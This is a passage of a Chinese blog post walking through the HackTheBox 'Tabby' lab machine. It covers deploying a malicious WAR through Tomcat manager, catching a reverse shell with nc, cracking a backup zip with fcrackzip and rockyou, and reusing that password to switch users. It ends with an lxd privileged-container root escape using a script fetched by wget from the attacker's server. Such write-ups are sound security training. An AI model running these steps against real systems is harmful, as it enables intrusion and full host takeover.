class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># curl --user &#x27;tomcat:$3cureP4s5w0rd123!&#x27; --upload-file exp.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/exp.war&quot;</span></span><br><span class="line">OK - Deployed application at context path [/exp.war]</span><br></pre></td></tr></table></figure><p><code>kali监听</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>访问http://10.10.10.194:8080/exp.war反弹shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.194] 51532</span><br><span class="line">whoami</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><p><code>升级shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>        </span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ whoami</span><br><span class="line">whoami</span><br><span class="line">tomcat</span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$</span><br></pre></td></tr></table></figure><p><code>升级为交互shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/var/lib/tomcat9$ ^Z</span><br><span class="line">[1]+  已停止               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line"></span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ </span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ whoami</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><h2 id="0x05-寻找有用的信息"><a href="#0x05-寻找有用的信息" class="headerlink" title="0x05.寻找有用的信息"></a>0x05.寻找有用的信息</h2><blockquote><p>在网站根目录下发现files文件，文件中有一个backup,zip文件，猜测为备份文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/var/www/html$ ls</span><br><span class="line">assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt</span><br><span class="line">tomcat@tabby:/var/www/html$ <span class="built_in">cd</span> files/</span><br><span class="line">tomcat@tabby:/var/www/html/files$ ls</span><br><span class="line">16162020_backup.zip  archive  revoked_certs  statement</span><br></pre></td></tr></table></figure><p><code>下载backup.zip，并解压，发现需要密码</code></p><img src="/2020/09/11/HTB-tabby/image-20200909183155978.png" class><p><code>使用fcrackzip爆破解压密码为admin@it</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip </span></span><br><span class="line">possible pw found: admin@it ()</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>解压得到了一个war目录，也没发现啥玩意</code></p><p><code>但拿admin@it登入ash却成功了。。。什么原理~</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/home$ ls</span><br><span class="line">ash</span><br><span class="line">tomcat@tabby:/home$ su ash</span><br><span class="line">Password: </span><br><span class="line">ash@tabby:/home$ </span><br><span class="line">ash@tabby:/home$ ls</span><br><span class="line">ash</span><br><span class="line">ash@tabby:/home$ <span class="built_in">cd</span></span><br><span class="line">ash@tabby:~$ ls</span><br><span class="line">alpine-v3.12-i686-20200909_0437.tar.gz    index.html  tmp</span><br><span class="line">alpine-v3.12-x86_64-20200909_1417.tar.gz  snap        user.txt</span><br><span class="line">ash@tabby:~$ cat user.txt </span><br><span class="line">*************************************</span><br><span class="line">ash@tabby:~$</span><br></pre></td></tr></table></figure><h2 id="0x06-提权"><a href="#0x06-提权" class="headerlink" title="0x06.提权"></a>0x06.提权</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhZ2h1bC9seGQtYWxwaW5lLWJ1aWxkZXI=">本次使用lxd<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTFhD">LXC/LXD参考1<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9saW51eGNvbnRhaW5lcnMub3JnL2x4Yy9pbnRyb2R1Y3Rpb24v">LXC/LXD参考2<i class="fa fa-external-link-alt"></i></span></p><p><code>先生成apline映像</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># git clone https://github.com/saghul/lxd-alpine-builder.git</span></span><br><span class="line">正克隆到 <span class="string">&#x27;lxd-alpine-builder&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 27, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span><br><span class="line">展开对象中: 100% (27/27), 15.98 KiB | 185.00 KiB/s, 完成.</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># ls</span></span><br><span class="line">16162020_backup.zip  exp.war  lxd-alpine-builder  nmap.CVT  user</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># cd lxd-alpine-builder/</span></span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ./build-alpine </span></span><br><span class="line">Determining the latest release... v3.12</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading alpine-keys-2.2-r0.apk</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading apk-tools-static-2.10.5-r1.apk</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: 成功</span><br><span class="line">Verified OK</span><br><span class="line">Selecting mirror http://dl-3.alpinelinux.org/alpine/v3.12/main</span><br><span class="line">fetch http://dl-3.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz</span><br><span class="line">(1/19) Installing musl (1.1.24-r9)</span><br><span class="line">(2/19) Installing busybox (1.31.1-r19)</span><br><span class="line">Executing busybox-1.31.1-r19.post-install</span><br><span class="line">(3/19) Installing alpine-baselayout (3.2.0-r7)</span><br><span class="line">Executing alpine-baselayout-3.2.0-r7.pre-install</span><br><span class="line">Executing alpine-baselayout-3.2.0-r7.post-install</span><br><span class="line">(4/19) Installing openrc (0.42.1-r11)</span><br><span class="line">Executing openrc-0.42.1-r11.post-install</span><br><span class="line">(5/19) Installing alpine-conf (3.9.0-r1)</span><br><span class="line">(6/19) Installing libcrypto1.1 (1.1.1g-r0)</span><br><span class="line">(7/19) Installing libssl1.1 (1.1.1g-r0)</span><br><span class="line">(8/19) Installing ca-certificates-bundle (20191127-r4)</span><br><span class="line">(9/19) Installing libtls-standalone (2.9.1-r1)</span><br><span class="line">(10/19) Installing ssl_client (1.31.1-r19)</span><br><span class="line">(11/19) Installing zlib (1.2.11-r3)</span><br><span class="line">(12/19) Installing apk-tools (2.10.5-r1)</span><br><span class="line">(13/19) Installing busybox-suid (1.31.1-r19)</span><br><span class="line">(14/19) Installing busybox-initscripts (3.2-r2)</span><br><span class="line">Executing busybox-initscripts-3.2-r2.post-install</span><br><span class="line">(15/19) Installing scanelf (1.2.6-r0)</span><br><span class="line">(16/19) Installing musl-utils (1.1.24-r9)</span><br><span class="line">(17/19) Installing libc-utils (0.7.2-r3)</span><br><span class="line">(18/19) Installing alpine-keys (2.2-r0)</span><br><span class="line">(19/19) Installing alpine-base (3.12.0-r0)</span><br><span class="line">Executing busybox-1.31.1-r19.trigger</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment">#</span></span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">alpine-v3.12-x86_64-20200909_1548.tar.gz  build-alpine  LICENSE  README.md</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>上传</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ wget http://10.10.17.216/exp.sh</span><br><span class="line">--2020-09-10 01:35:29--  http://10.10.17.216/exp.sh</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 582 [text/x-sh]</span><br><span class="line">Saving to: ‘exp.sh’</span><br><span class="line"></span><br><span class="line">exp.sh              100%[===================&gt;]     582  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-09-10 01:35:30 (72.2 MB/s) - ‘exp.sh’ saved [582/582]</span><br><span class="line"></span><br><span class="line">&lt;.10.17.216/alpine-v3.12-x86_64-20200909_1548.tar.gz</span><br><span class="line">--2020-09-10 01:38:02--  http://10.10.17.216/alpine-v3.12-x86_64-20200909_1548.tar.gz</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3201921 (3.1M) [application/gzip]</span><br><span class="line">Saving to: ‘alpine-v3.12-x86_64-20200909_1548.tar.gz’</span><br><span class="line"></span><br><span class="line">alpine-v3.12-x86_64 100%[===================&gt;]   3.05M   665KB/s    <span class="keyword">in</span> 9.5s    </span><br><span class="line"></span><br><span class="line">2020-09-10 01:38:12 (328 KB/s) - ‘alpine-v3.12-x86_64-20200909_1548.tar.gz’ saved [3201921/3201921]</span><br><span class="line"></span><br><span class="line">ash@tabby:/tmp$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200909_1548.tar.gz   hsperfdata_tomcat</span><br><span class="line">ash@tabby:/tmp$</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.194 - - [09/Sep/2020 20:42:27] <span class="string">&quot;GET /alpine-v3.12-x86_64-20200909_1548.tar.gz HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>构造shell脚本</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># cat exp.sh </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc image import---------------&quot;</span></span><br><span class="line">lxc image import ./alpine-v3.12-x86_64-20200909_1548.tar.gz --<span class="built_in">alias</span> fjy</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc image list-----------------&quot;</span></span><br><span class="line">lxc image list</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------lxc container creating-------------&quot;</span></span><br><span class="line">lxd init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------lxc security.privileged=true---------&quot;</span></span><br><span class="line">lxc init fjy fjy-tabby -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;------------lxc config device----------------&quot;</span></span><br><span class="line">lxc config device add fjy-tabby mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc starting-------------------&quot;</span></span><br><span class="line">lxc start fjy-tabby</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>上传</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ wget http://10.10.17.216/exp.sh</span><br><span class="line">--2020-09-10 01:35:29--  http://10.10.17.216/exp.sh</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 582 [text/x-sh]</span><br><span class="line">Saving to: ‘exp.sh’</span><br><span class="line"></span><br><span class="line">exp.sh              100%[===================&gt;]     582  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-09-10 01:35:30 (72.2 MB/s) - ‘exp.sh’ saved [582/582]</span><br><span class="line"></span><br><span class="line">ash@tabby:/tmp$</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.194 - - [09/Sep/2020 21:06:20] <span class="string">&quot;GET /exp.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>执行</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:~/tmp$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200910_2121.tar.gz  exp.sh</span><br><span class="line">ash@tabby:~/tmp$ ./exp.sh </span><br><span class="line">--------------lxc image import---------------</span><br><span class="line">--------------lxc image list-----------------</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| fjy   | 24645e832789 | no     | alpine v3.12 (20200910_21:21) | x86_64       | CONTAINER | 3.05MB | Sep 11, 2020 at 2:31am (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">----------lxc container creating-------------</span><br><span class="line">Would you like to use LXD clustering? (yes/no) [default=no]: yes</span><br><span class="line">What name should be used to identify this node <span class="keyword">in</span> the cluster? [default=tabby]: </span><br><span class="line">What IP address or DNS name should be used to reach this node? [default=10.10.10.194]: </span><br><span class="line">Are you joining an existing cluster? (yes/no) [default=no]: </span><br><span class="line">Setup password authentication on the cluster? (yes/no) [default=yes]: </span><br><span class="line">Trust password <span class="keyword">for</span> new clients: </span><br><span class="line">Again: </span><br><span class="line">Do you want to configure a new <span class="built_in">local</span> storage pool? (yes/no) [default=yes]: </span><br><span class="line">Name of the storage backend to use (zfs, btrfs, dir, lvm) [default=zfs]: </span><br><span class="line">Create a new ZFS pool? (yes/no) [default=yes]: </span><br><span class="line">Would you like to use an existing block device? (yes/no) [default=no]: </span><br><span class="line">Size <span class="keyword">in</span> GB of the new loop device (1GB minimum) [default=15GB]: </span><br><span class="line">Do you want to configure a new remote storage pool? (yes/no) [default=no]: </span><br><span class="line">Would you like to connect to a MAAS server? (yes/no) [default=no]: </span><br><span class="line">Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: </span><br><span class="line">Would you like to create a new Fan overlay network? (yes/no) [default=yes]: </span><br><span class="line">What subnet should be used as the Fan underlay? [default=auto]: </span><br><span class="line">Would you like stale cached images to be updated automatically? (yes/no) [default=yes] </span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (yes/no) [default=no]: </span><br><span class="line">--------lxc security.privileged=<span class="literal">true</span>---------</span><br><span class="line">Creating fjy-tabby</span><br><span class="line">------------lxc config device----------------</span><br><span class="line">Device mydevice added to fjy-tabby</span><br><span class="line">--------------lxc starting-------------------</span><br><span class="line">ash@tabby:~/tmp$ lxc <span class="built_in">exec</span> fjy-tabby /bin/sh</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">~ <span class="comment"># cd /mnt/root/</span></span><br><span class="line">/mnt/root <span class="comment"># ls</span></span><br><span class="line">bin         home        lost+found  root        swap.img</span><br><span class="line">boot        lib         media       run         sys</span><br><span class="line">cdrom       lib32       mnt         sbin        tmp</span><br><span class="line">dev         lib64       opt         snap        usr</span><br><span class="line">etc         libx32      proc        srv         var</span><br><span class="line">/mnt/root <span class="comment"># cd root/</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt </span></span><br><span class="line">*************************</span><br><span class="line">/mnt/root/root <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2020/09/11/HTB-tabby/image-20200909145742353.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
</feed>
